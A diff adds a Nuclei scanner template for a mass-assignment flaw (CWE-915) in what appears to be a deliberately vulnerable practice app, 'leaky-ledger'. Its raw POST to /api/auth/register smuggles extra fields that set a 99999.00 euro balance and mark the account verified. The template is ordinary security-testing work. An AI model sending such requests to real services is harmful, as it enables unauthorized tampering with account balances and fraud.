@@ -1,0 +1,32 @@
+id: leaky-ledger-mass-assignment-register
+
+info:
+  name: leaky-ledger - mass assignment on register
+  author: leaky-ledger
+  severity: high
+  description: Registers a user with an extra balance_eur field and checks whether it sticks.
+  classification:
+    cwe-id: CWE-915
+  tags: mass-assignment,api,leaky-ledger
+
+variables:
+  user: "nuclei{{rand_text_alphanumeric(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/auth/register HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{user}}","password":"x","balance_eur":"99999.00","is_verified":true}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+      - type: word
+        part: body
+        words:
+          - '"balance_eur":"99999.00"'
